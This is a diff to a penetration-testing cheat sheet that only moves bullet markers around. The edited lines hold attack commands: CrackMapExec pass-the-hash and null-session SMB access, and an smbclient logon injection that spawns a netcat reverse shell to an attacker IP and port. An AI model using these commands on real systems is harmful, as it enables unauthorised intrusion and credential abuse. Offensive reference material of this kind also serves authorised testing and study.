@@ -326,14 +326,14 @@ sort <WORDLIST_PATH> | uniq | wc -l  (sorts number of unique words in a wordlist
 ip -4 addr show scope global    /*Determine interfaces ip address + prefix*/
 ip route show | grep default    /*Determine which interface is public*/
 
-* **CME**
-crackmapexec smb <TARGET/S> -u <LOCAL_USER_NAME> -H <XXX_LMHASH_XX>:<XXX_NTHASH_000> --local (PTH local creds) 
-crackmapexec smb <TARGET/S> -u '' -p '' (NULL Sessions)
-cmedb - creds/hosts (show results)
+**CME**
+* crackmapexec smb <TARGET/S> -u <LOCAL_USER_NAME> -H <XXX_LMHASH_XX>:<XXX_NTHASH_000> --local (PTH local creds) 
+* crackmapexec smb <TARGET/S> -u '' -p '' (NULL Sessions)
+* cmedb - creds/hosts (show results)
 
-* **SMBclient**
-smbclient '\\<TARGET_IP>\<Share>'
-smb: \> logon "/='nc <ATTACKERS_IP> <ATTACKERS_PORT> -e /bin/bash'"
+**SMBclient**
+* smbclient '\\<TARGET_IP>\<Share>'
+* smb: \> logon "/='nc <ATTACKERS_IP> <ATTACKERS_PORT> -e /bin/bash'"
 
 
 -----------------------------------------------------------------------------------------------------
